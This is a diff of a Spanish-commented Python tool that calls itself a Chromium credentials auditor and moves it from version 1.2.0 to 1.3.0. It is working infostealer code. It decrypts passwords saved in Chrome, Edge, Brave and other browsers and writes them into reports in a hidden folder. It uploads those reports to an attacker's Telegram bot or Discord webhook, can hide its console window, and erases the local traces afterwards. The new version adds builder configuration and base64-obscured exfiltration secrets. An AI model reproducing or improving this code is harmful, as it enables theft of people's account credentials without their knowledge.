@@ -16,29 +16,29 @@ import requests
 from pathlib import Path
 from datetime import datetime
 
-__version__ = "1.2.0"
+__version__ = "1.3.0"
 
 # =========================================================================
-# CREDENCIALES HARDCODED (Opcional - Úsalas en BASE64 para mayor sigilo)
+# ⚙️ CONFIGURACIÓN CORE (Accesible para el Builder/GUI)
 # =========================================================================
-# Tip: Convierte tus credenciales en Base64 con cualquier conversor online.
-# =========================================================================
-HARDCODED_TG_TOKEN   = ""  # Token del bot de Telegram      (B64 o Plano)
-HARDCODED_TG_ID      = ""  # ID de destino: chat/grupo/canal (B64 o Plano)
-HARDCODED_DS_WEBHOOK = ""  # URL del Webhook de Discord      (B64 o Plano)
+CONFIG = {
+    "tg_token":   "",  
+    "tg_chat_id": "",  
+    "ds_webhook": "",  
+    "stealth":    False,
+    "output_dir": ".audit",
+    "delay":      0      
+}
 # =========================================================================
 
 if sys.platform != "win32":
     sys.exit(1)
 
 def safe_b64_decode(val):
-    """Intenta decodificar Base64 estricto. Si falla, devuelve el original intacto."""
-    if not val:
-        return ""
+    if not val: return ""
     try:
         return base64.b64decode(val, validate=True).decode('utf-8')
-    except Exception:
-        return val
+    except: return val
 
 try:
     win32crypt = importlib.import_module('win32crypt')
@@ -48,50 +48,31 @@ except ImportError:
 from Cryptodome.Cipher import AES
 
 def _get_base_dir() -> Path:
-    """Directorio del ejecutable/script. Compatible con PyInstaller (frozen)."""
     if getattr(sys, 'frozen', False):
         return Path(sys.executable).parent
     return Path(__file__).parent
 
-def _setup_output_dir(preferred: Path) -> Path:
-    """Crea la carpeta de salida oculta. Si el directorio no tiene permisos de escritura,
-    usa APPDATA como fallback (compatible con C:\\Program Files\\ y rutas protegidas)."""
-    for candidate in (preferred, Path(os.environ.get('APPDATA', os.getcwd())) / ".audit"):
+def _setup_environment(output_path: str):
+    base = _get_base_dir()
+    out_dir = base / output_path
+    for candidate in (out_dir, Path(os.environ.get('APPDATA', os.getcwd())) / output_path):
         try:
-            candidate.mkdir(exist_ok=True)
-            # OR con atributos existentes para no destruir flags del sistema (SYSTEM, etc.)
+            candidate.mkdir(exist_ok=True, parents=True)
             existing = ctypes.windll.kernel32.GetFileAttributesW(str(candidate))
-            if existing != 0xFFFFFFFF:  # INVALID_FILE_ATTRIBUTES
+            if existing != 0xFFFFFFFF:
                 ctypes.windll.kernel32.SetFileAttributesW(str(candidate), existing | 0x2)
+            log_file = candidate / "pentest_audit.log"
+            handlers = [logging.FileHandler(log_file, encoding='utf-8')]
+            try:
+                if sys.stdout and sys.stdout.isatty():
+                    handlers.append(logging.StreamHandler(sys.stdout))
+            except: pass
+            logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', handlers=handlers)
             return candidate
-        except OSError:
-            continue
-    return preferred  # Último recurso: usar la ruta original aunque falle el ocultar
+        except: continue
+    return out_dir
 
-OUTPUT_DIR = _setup_output_dir(_get_base_dir() / ".audit")
-
-_PID     = os.getpid()
-LOG_FILE = OUTPUT_DIR / "pentest_audit.log"
-
-_handlers = []
-try:
-    _handlers.append(logging.FileHandler(LOG_FILE, encoding='utf-8'))
-except (PermissionError, OSError):
-    pass  # Sin permisos de escritura: solo log en consola si está disponible
-try:
-    sys.stdout.fileno()
-    _handlers.append(logging.StreamHandler(sys.stdout))
-except (AttributeError, OSError):
-    pass
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=_handlers
-)
-logger = logging.getLogger(__name__)
-
-if win32crypt is None:
-    logger.critical("pywin32 no instalado. Ejecuta: pip install pywin32")
+logger = logging.getLogger("AuditorCore")
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -117,19 +98,13 @@ HTML_TEMPLATE = """
         .footer { margin-top: 20px; font-size: 0.9em; color: #777; text-align: center; }
         .skipped { color: #aaa; font-style: italic; }
         .actions { margin: 20px 0; text-align: right; }
-        .btn-export { 
-            background-color: #27ae60; color: white; padding: 10px 20px; border: none; 
-            border-radius: 5px; cursor: pointer; font-weight: bold; transition: background 0.3s;
-            text-decoration: none; display: inline-block;
-        }
+        .btn-export { background-color: #27ae60; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background 0.3s; text-decoration: none; display: inline-block; }
         .btn-export:hover { background-color: #2ecc71; }
     </style>
     <script>
         function exportToCSV() {
             let csv = [];
             csv.push("# Reporte de Auditoria Chromium");
-            csv.push("# Generado por la Suite de Auditoria");
-            
             const tables = document.querySelectorAll("table");
             tables.forEach((table, index) => {
                 if(index > 0) csv.push("\\n# --- SECCION SIGUIENTE ---");
@@ -145,11 +120,9 @@ HTML_TEMPLATE = """
                     csv.push(rowData.join(","));
                 });
             });
-
             const csvFile = new Blob([csv.join("\\n")], {type: "text/csv;charset=utf-8;"});
             const downloadLink = document.createElement("a");
-            const stamp = new Date().toISOString().replace(/[:.]/g, "-");
-            downloadLink.download = "audit_export_" + stamp + ".csv";
+            downloadLink.download = "audit_export_" + new Date().toISOString().replace(/[:.]/g, "-") + ".csv";
             downloadLink.href = window.URL.createObjectURL(csvFile);
             downloadLink.style.display = "none";
             document.body.appendChild(downloadLink);
@@ -163,40 +136,13 @@ HTML_TEMPLATE = """
         <h1>Auditoría de Credenciales Chromium</h1>
         <div style="background:#f8f9fa; border-left:4px solid #3498db; padding:12px 16px; margin-bottom:16px; font-size:0.92em; border-radius:0 4px 4px 0;">
             <strong>Metadatos del Reporte</strong><br>
-            Fecha: <b>{{date}}</b> &nbsp;|&nbsp;
-            Host: <b>{{hostname}}</b> &nbsp;|&nbsp;
-            Usuario: <b>{{username}}</b> &nbsp;|&nbsp;
-            PID: <b>{{pid}}</b> &nbsp;|&nbsp;
-            Versión: <b>{{version}}</b><br>
-            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp;
-            Filtradas (no-HTTP): <b>{{filtered_count}}</b>
+            Fecha: <b>{{date}}</b> &nbsp;|&nbsp; Host: <b>{{hostname}}</b> &nbsp;|&nbsp; Usuario: <b>{{username}}</b> &nbsp;|&nbsp; PID: <b>{{pid}}</b> &nbsp;|&nbsp; Versión: <b>{{version}}</b><br>
+            Credenciales válidas: <b>{{total}}</b> &nbsp;|&nbsp; Filtradas: <b>{{filtered_count}}</b>
         </div>
-        
-        <div class="actions">
-            <button onclick="exportToCSV()" class="btn-export">📊 Exportar a CSV</button>
-        </div>
-
-        <table>
-            <thead>
-                <tr>
-                    <th>Navegador</th>
-                    <th>Perfil</th>
-                    <th>URL</th>
-                    <th>Usuario</th>
-                    <th>Contraseña</th>
-                </tr>
-            </thead>
-            <tbody>
-                {{rows}}
-            </tbody>
-        </table>
-        
+        <div class="actions"><button onclick="exportToCSV()" class="btn-export">📊 Exportar a CSV</button></div>
+        <table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{{rows}}</tbody></table>
         {{filtered_section}}
-
-        <div class="footer">
-            Suite de Auditoría Profesional - Uso bajo responsabilidad ética
-            <span class="skipped">{{skipped_note}}</span>
-        </div>
+        <div class="footer">Suite de Auditoría Profesional <span class="skipped">{{skipped_note}}</span></div>
     </div>
 </body>
 </html>
@@ -206,67 +152,45 @@ REQUEST_TIMEOUT = 15
 MAX_RETRIES     = 3
 VALID_URL_PREFIXES = ('http://', 'https://')
 
-
 def retry_request(func):
-    """Decorador que reintenta peticiones HTTP. Devuelve False si fallan todos los intentos,
-    NUNCA propaga la excepción al caller para garantizar que el proceso no muera."""
     def wrapper(*args, **kwargs):
         for i in range(MAX_RETRIES):
-            try:
-                return func(*args, **kwargs)
-            except (requests.exceptions.RequestException, Exception) as e:
-                logger.warning(f"Intento {i+1}/{MAX_RETRIES} fallido: {e}")
-        logger.error(f"Todos los intentos de {func.__name__} agotados. Abortando envío.")
+            try: return func(*args, **kwargs)
+            except Exception as e: logger.warning(f"Intento {i+1} fallido: {e}")
         return False
     return wrapper
 
-
 class Exfiltrator:
     def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
-        self.telegram_token   = telegram_token
-        self.telegram_chat_id = telegram_chat_id
-        self.discord_webhook  = discord_webhook
+        self.tg_token = telegram_token
+        self.tg_id    = telegram_chat_id
+        self.ds_hook  = discord_webhook
+
+    def send_files(self, file_paths):
+        for p in file_paths:
+            self.send_to_telegram(p)
+            self.send_to_discord(p)
 
     @retry_request
     def send_to_telegram(self, file_path):
-        if not self.telegram_token or not self.telegram_chat_id:
-            return False
-        url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
+        if not self.tg_token or not self.tg_id: return False
+        url = f"https://api.telegram.org/bot{self.tg_token}/sendDocument"
         with open(file_path, 'rb') as f:
-            response = requests.post(
-                url,
-                data={'chat_id': self.telegram_chat_id},
-                files={'document': f},
-                timeout=REQUEST_TIMEOUT
-            )
-        if response.status_code == 200:
-            logger.info("Exfiltración vía Telegram exitosa.")
-            return True
-        logger.error(f"Telegram HTTP {response.status_code}: {response.text[:200]}")
-        return False
+            r = requests.post(url, data={'chat_id': self.tg_id}, files={'document': f}, timeout=REQUEST_TIMEOUT)
+        return r.status_code == 200
 
     @retry_request
     def send_to_discord(self, file_path):
-        if not self.discord_webhook:
-            return False
+        if not self.ds_hook: return False
         with open(file_path, 'rb') as f:
-            response = requests.post(
-                self.discord_webhook,
-                files={'file': f},
-                timeout=REQUEST_TIMEOUT
-            )
-        if response.status_code in (200, 204):
-            logger.info("Exfiltración vía Discord exitosa.")
-            return True
-        logger.error(f"Discord HTTP {response.status_code}: {response.text[:200]}")
-        return False
-
+            r = requests.post(self.ds_hook, files={'file': f}, timeout=REQUEST_TIMEOUT)
+        return r.status_code in (200, 204)
 
 class ChromiumDecryptor:
     def __init__(self):
         self.local   = Path(os.environ.get('LOCALAPPDATA', ''))
         self.roaming = Path(os.environ.get('APPDATA', ''))
-        self.browsers = {
+        self.browsers_paths = {
             "Chrome":   self.local   / "Google/Chrome/User Data",
             "Edge":     self.local   / "Microsoft/Edge/User Data",
             "Brave":    self.local   / "BraveSoftware/Brave-Browser/User Data",
@@ -277,282 +201,157 @@ class ChromiumDecryptor:
 
     def get_key(self, path):
         ls = path / "Local State"
-        if not ls.exists():
-            return None
+        if not ls.exists(): return None
         try:
-            with open(ls, "r", encoding='utf-8') as f:
-                config = json.load(f)
+            with open(ls, "r", encoding='utf-8') as f: config = json.load(f)
             key = base64.b64decode(config["os_crypt"]["encrypted_key"])[5:]
             return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1] if win32crypt else None
-        except Exception:
-            return None
+        except: return None
 
     def decrypt(self, blob, key):
-        """Descifra datos de Chromium con fallback mejorado para versiones sin prefijo estándar."""
-        if not blob:
-            return ""
-        
-        if not isinstance(blob, (bytes, bytearray)):
-            try:
-                blob = bytes(blob)
-            except Exception:
-                return "[Error: Formato de datos inválido]"
-
-        if len(blob) < 3:
-            return "[Error: Dato muy corto]"
-
+        if not blob or len(blob) < 3: return ""
         try:
-            # Caso 1: Intentar AES-GCM si tenemos la Master Key y longitud suficiente
-            # Somos más permisivos que antes: si tiene longitud de AES, probamos aunque falte el prefijo 'v10'
             if key and len(blob) >= 32:
                 try:
-                    nonce   = blob[3:15]
-                    payload = blob[15:-16]
-                    cipher  = AES.new(key, AES.MODE_GCM, nonce)
-                    decrypted = cipher.decrypt(payload)
-                    return decrypted.decode('utf-8', errors='replace')
-                except Exception:
-                    # Si falla el intento de AES, bajamos al método Legacy DPAPI
-                    pass
-
-            # Caso 2: Legacy DPAPI (para versiones muy antiguas o blobs específicos)
+                    nonce, payload = blob[3:15], blob[15:-16]
+                    cipher = AES.new(key, AES.MODE_GCM, nonce)
+                    return cipher.decrypt(payload).decode('utf-8', errors='replace')
+                except: pass
             if win32crypt:
-                decrypted = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1]
-                return decrypted.decode('utf-8', errors='replace')
-            
-            return "[Error: Falta pywin32 para Legacy]"
+                return win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode('utf-8', errors='replace')
+        except: pass
+        return "[Error]"
 
-        except Exception as e:
-            err_type = type(e).__name__
-            logger.debug(f"Falla en descifrado ({err_type}): {e}")
-            return f"[Error: {err_type}]"
-
-    def audit(self, fmt="html", out="audit_report"):
-        data          = []
-        filtered_data = []
-        skipped       = 0
-
-        for name, path in self.browsers.items():
-            if not path.exists():
-                continue
+    def find_targets(self):
+        targets = []
+        for name, path in self.browsers_paths.items():
+            if not path.exists(): continue
             key = self.get_key(path)
-            if not key:
-                continue
-            profs = []
+            if not key: continue
             try:
-                # Detección exhaustiva de perfiles (Default, Profile X, o carpeta base si no hay subcarpetas)
-                profs = [p for p in path.iterdir()
-                         if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
-            except Exception as e:
-                logger.warning(f"Error detectando perfiles en {name}: {e}")
-
-            if not profs:
-                # Algunos navegadores (como Opera antiguo o versiones custom) usan la ruta base directamente
-                profs = [path]
-
+                profs = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))]
+            except: profs = []
+            if not profs: profs = [path]
             for p in profs:
                 db = p / "Login Data"
-                if not db.exists():
-                    continue
-                tmp  = OUTPUT_DIR / f"tmp_audit_{_PID}.db"
-                conn = None
-                try:
-                    shutil.copy2(db, tmp)
-                    conn   = sqlite3.connect(tmp)
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for row in cursor.fetchall():
-                        if not (row[0] and row[1] and row[2]):
-                            continue
-                        if not row[0].startswith(VALID_URL_PREFIXES):
-                            filtered_data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
-                            skipped += 1
-                            continue
-                        data.append([name, p.name, row[0], row[1], self.decrypt(row[2], key)])
-                    cursor.close()
-                except Exception as e:
-                    logger.warning(f"Error leyendo {name}/{p.name}: {e}")
-                finally:
-                    if conn:
-                        conn.close()
-                    tmp.unlink(missing_ok=True)
+                if db.exists(): targets.append({"name": name, "profile": p.name, "db_path": db, "key": key})
+        return targets
 
-        if skipped:
-            logger.info(f"{skipped} entradas descartadas (URLs no-http).")
+    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None):
+        targets = self.find_targets()
+        if browser_filter:
+            targets = [t for t in targets if browser_filter.lower() in t['name'].lower()]
+        
+        data, filtered = [], []
+        for t in targets:
+            logger.info(f"Auditando: {t['name']} ({t['profile']})")
+            tmp = output_dir / f"tmp_{os.getpid()}.db"
+            conn = None
+            try:
+                shutil.copy2(t['db_path'], tmp)
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for row in cursor.fetchall():
+                    if not (row[0] and row[1] and row[2]): continue
+                    val = self.decrypt(row[2], t['key'])
+                    entry = [t['name'], t['profile'], row[0], row[1], val]
+                    if row[0].startswith(VALID_URL_PREFIXES): data.append(entry)
+                    else: filtered.append(entry)
+            except Exception as e: logger.warning(f"Error en {t['name']}: {e}")
+            finally:
+                if conn: conn.close()
+                tmp.unlink(missing_ok=True)
 
-        if not data:
-            logger.info("No se encontraron credenciales.")
-            return 0, None
+        if not data and not filtered: return None, None, None
 
-        stamp      = datetime.now().strftime("%Y%m%d_%H%M%S")
-        base_out   = OUTPUT_DIR / f"{out}.{fmt}"
-        final_out  = OUTPUT_DIR / f"{out}_{stamp}.{fmt}" if base_out.exists() else base_out
-        if final_out != base_out:
-            logger.info(f"Archivo existente. Guardando como: {final_out.name}")
+        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        h_p = output_dir / f"audit_report_{stamp}.html" if not skip_html else None
+        c_p = output_dir / f"audit_report_{stamp}.csv" if not skip_csv else None
 
-        skipped_note  = f" · {skipped} entradas no-http descartadas" if skipped else ""
-        hostname      = socket.gethostname()
-        username      = getpass.getuser()
-        date_readable = (stamp[:4] + "-" + stamp[4:6] + "-" + stamp[6:8]
-                         + " " + stamp[9:11] + ":" + stamp[11:13])
+        if h_p:
+            r_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in data])
+            f_h = "".join([f"<tr><td><span class='browser-badge {r[0].lower().replace(' ','-')}'>{html.escape(r[0])}</span></td><td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td><td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>" for r in filtered])
+            f_s = f'<h2 style="margin-top:40px;color:#e67e22;border-bottom:2px solid #e67e22;">Entradas Filtradas</h2><table><thead><tr><th>Navegador</th><th>Perfil</th><th>URL</th><th>Usuario</th><th>Contraseña</th></tr></thead><tbody>{f_h}</tbody></table>' if filtered else ""
+            content = (HTML_TEMPLATE.replace("{{total}}", str(len(data))).replace("{{filtered_count}}", str(len(filtered)))
+                       .replace("{{date}}", datetime.now().strftime("%Y-%m-%d %H:%M")).replace("{{hostname}}", socket.gethostname())
+                       .replace("{{username}}", getpass.getuser()).replace("{{pid}}", str(os.getpid()))
+                       .replace("{{version}}", __version__).replace("{{rows}}", r_h).replace("{{filtered_section}}", f_s)
+                       .replace("{{skipped_note}}", f" ({len(filtered)} filtrados)" if filtered else ""))
+            with open(h_p, "w", encoding='utf-8') as f: f.write(content)
 
-        if fmt == "csv":
-            with open(final_out, 'w', newline='', encoding='utf-8') as f:
+        if c_p:
+            with open(c_p, 'w', newline='', encoding='utf-8') as f:
                 w = csv.writer(f)
-                # Metadata header rows (prefixed with # for easy parsing)
-                w.writerow(["# Reporte Chromium Credentials Auditor"])
-                w.writerow([f"# Fecha: {date_readable}"])
-                w.writerow([f"# Host: {hostname}"])
-                w.writerow([f"# Usuario: {username}"])
-                w.writerow([f"# PID: {_PID}"])
-                w.writerow([f"# Version: {__version__}"])
-                w.writerow([f"# Total validos: {len(data)} | Filtrados: {skipped}"])
-                w.writerow([])  # blank separator
+                w.writerow([f"# Reporte Auditoria | Host: {socket.gethostname()} | User: {getpass.getuser()} | Ver: {__version__}"])
                 w.writerow(["Browser", "Profile", "URL", "User", "Pass"])
                 w.writerows(data)
-
-        elif fmt == "html":
-            rows_html = ""
-            for r in data:
-                badge_class = r[0].lower().replace(' ', '-')
-                rows_html += (
-                    f"<tr><td><span class='browser-badge {badge_class}'>{html.escape(r[0])}</span></td>"
-                    f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
-                    f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
-                )
-            # Generar sección de filtrados
-            filtered_section = ""
-            if filtered_data:
-                filtered_rows = ""
-                for r in filtered_data:
-                    badge_class = r[0].lower().replace(' ', '-')
-                    filtered_rows += (
-                        f"<tr><td><span class='browser-badge {badge_class}'>{html.escape(r[0])}</span></td>"
-                        f"<td>{html.escape(r[1])}</td><td>{html.escape(r[2])}</td>"
-                        f"<td>{html.escape(r[3])}</td><td>{html.escape(r[4])}</td></tr>"
-                    )
-                filtered_section = f"""
-                <h2 style="margin-top: 40px; color: #e67e22; border-bottom: 2px solid #e67e22; padding-bottom: 10px;">Entradas Filtradas (No-HTTP/Otros)</h2>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Navegador</th>
-                            <th>Perfil</th>
-                            <th>URL / Protocolo</th>
-                            <th>Usuario</th>
-                            <th>Contraseña</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        {filtered_rows}
-                    </tbody>
-                </table>
-                """
-
-            # total y date se reemplazan ANTES que rows para evitar colisión con datos de usuario
-            html_out = (HTML_TEMPLATE
-                        .replace("{{total}}", str(len(data)))
-                        .replace("{{filtered_count}}", str(skipped))
-                        .replace("{{date}}", date_readable)
-                        .replace("{{hostname}}", html.escape(hostname))
-                        .replace("{{username}}", html.escape(username))
-                        .replace("{{pid}}", str(_PID))
-                        .replace("{{version}}", html.escape(__version__))
-                        .replace("{{skipped_note}}", skipped_note)
-                        .replace("{{rows}}", rows_html)
-                        .replace("{{filtered_section}}", filtered_section))
-            with open(final_out, "w", encoding='utf-8') as f:
-                f.write(html_out)
-
-        logger.info(f"Reporte guardado en: {final_out}")
-        return len(data), final_out
-
-
-def _close_log_handler():
-    """Cierra el FileHandler del root logger antes de borrar el archivo de log."""
-    for handler in logging.root.handlers[:]:
-        if isinstance(handler, logging.FileHandler):
-            handler.close()
-            logging.root.removeHandler(handler)
-
+                if filtered:
+                    w.writerow([]); w.writerow(["# --- FILTRADOS ---"])
+                    w.writerows(filtered)
+        return (data + filtered), h_p, c_p
 
 def main():
-    parser = argparse.ArgumentParser(description="Chromium Credentials Auditor Suite")
-    parser.add_argument("-f", "--format",  choices=["csv", "html"], default="html",
-                        help="Formato de salida del reporte.")
-    parser.add_argument("-o", "--output",  default="audit_report",
-                        help="Nombre base del archivo de salida.")
-    parser.add_argument("-t", "--telegram-token",  default=HARDCODED_TG_TOKEN,
-                        help="Token del bot de Telegram (Plano o Base64).")
-    parser.add_argument("-c", "--telegram-chatid", default=HARDCODED_TG_ID,
-                        help="Chat ID personal de Telegram (Plano o Base64).")
-    parser.add_argument("-d", "--discord", default=HARDCODED_DS_WEBHOOK,
-                        help="URL del Webhook de Discord (Plano o Base64).")
-    parser.add_argument("-s", "--stealth", action="store_true",
-                        help="Modo sigiloso: oculta la ventana de consola (idéntico a .exe --noconsole).")
-    parser.add_argument("--no-wipe", action="store_true",
-                        help="Desactiva el auto-borrado del reporte tras exfiltración.")
-    parser.add_argument("--clean", action="store_true",
-                        help="Elimina todos los reportes acumulados en la carpeta de salida y sale.")
-    parser.add_argument("-v", "--verbose", action="store_true",
-                        help="Muestra logs detallados de depuración en consola.")
-
+    parser = argparse.ArgumentParser(description=f"Chromium Auditor Core v{__version__}")
+    ex = parser.add_argument_group("Exfiltración")
+    ex.add_argument("--webhook", help="Discord Webhook")
+    ex.add_argument("--tg-token", help="Telegram Token")
+    ex.add_argument("--tg-chat-id", help="Telegram Chat ID")
+    ex.add_argument("--no-exfil", action="store_true")
+    
+    re = parser.add_argument_group("Reportes")
+    re.add_argument("--no-html", action="store_true")
+    re.add_argument("--no-csv", action="store_true")
+    re.add_argument("--json", action="store_true")
+    re.add_argument("--output-dir", default=CONFIG["output_dir"])
+    
+    en = parser.add_argument_group("Motor")
+    en.add_argument("--browser", help="Filtro de navegador (ej: brave, chrome)")
+    en.add_argument("--delay", type=int, default=CONFIG["delay"])
+    en.add_argument("--clean", action="store_true")
+    en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"])
+    en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
+    en.add_argument("--debug", action="store_true", help="Activar logs detallados")
+    
     args = parser.parse_args()
-
-    if args.stealth:
-        # Ocultar consola AQUÍ: después de parsear args, cuando ya sabemos que el
-        # proceso arrancó bien. Hacerlo al inicio del módulo mascaraba errores de
-        # importación en otras PCs con pywin32 mal instalado.
-        if getattr(sys, 'frozen', False):
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-            if hwnd:
-                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
-        for handler in logging.root.handlers[:]:
-            if isinstance(handler, logging.StreamHandler) and not isinstance(handler, logging.FileHandler):
-                logging.root.removeHandler(handler)
-        if args.verbose:
-            logging.getLogger().setLevel(logging.DEBUG)  # bajar nivel ANTES de loggear
-            logger.debug("Modo verbose activo en stealth; logs DEBUG → solo al archivo.")
-
-    elif args.verbose:
+    
+    if args.debug:
         logging.getLogger().setLevel(logging.DEBUG)
-        logger.debug("Modo verbose activado.")
 
-    token   = safe_b64_decode(args.telegram_token)
-    chatid  = safe_b64_decode(args.telegram_chatid)
-    discord = safe_b64_decode(args.discord)
-
+    if args.stealth and sys.platform == "win32":
+        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except: pass
+    
+    out = _setup_environment(args.output_dir)
     if args.clean:
-        patterns = ["*.html", "*.csv"]
-        removed  = 0
-        for pat in patterns:
-            for f in OUTPUT_DIR.glob(pat):
-                try:
-                    f.unlink()
-                    removed += 1
-                    logger.info(f"Eliminado: {f.name}")
-                except OSError as e:
-                    logger.warning(f"No se pudo eliminar {f.name}: {e}")
-        logger.info(f"Limpieza completada: {removed} archivo(s) eliminado(s) de {OUTPUT_DIR}")
+        for ext in ("*.html", "*.csv", "*.json"):
+            for f in out.glob(ext): f.unlink()
         return
-
-    logger.info("Iniciando Chromium Credentials Auditor Suite...")
-
-    count, final_file = ChromiumDecryptor().audit(args.format, args.output)
-    logger.info(f"Escaneo finalizado: {count} credenciales extraídas.")
-
-    if count > 0 and final_file:
-        exf = Exfiltrator(token, chatid, discord)
-        if token and chatid:
-            exf.send_to_telegram(final_file)
-        if discord:
-            exf.send_to_discord(final_file)
-
-        if not args.no_wipe and (token or discord):
-            Path(final_file).unlink(missing_ok=True)
-            _close_log_handler()  # cerrar FileHandler ANTES de borrar el .log
-            LOG_FILE.unlink(missing_ok=True)
-
+    
+    if args.delay > 0:
+        import time
+        time.sleep(args.delay)
+    
+    ds_w = args.webhook or safe_b64_decode(CONFIG["ds_webhook"])
+    tg_t = args.tg_token or safe_b64_decode(CONFIG["tg_token"])
+    tg_c = args.tg_chat_id or safe_b64_decode(CONFIG["tg_chat_id"])
+    
+    auditor = ChromiumDecryptor()
+    results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser)
+    
+    if results and args.json:
+        jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
+    
+    if results and not args.no_exfil:
+        exf = Exfiltrator(tg_t, tg_c, ds_w)
+        files = [p for p in (hp, cp) if p and p.exists()]
+        if files:
+            exf.send_files(files)
+            # Auto-wipe local reports tras exfiltrar, a menos que --no-wipe esté activo
+            if not args.no_wipe and (tg_t or ds_w):
+                for p in files:
+                    p.unlink(missing_ok=True)
 
 if __name__ == "__main__":
     main()
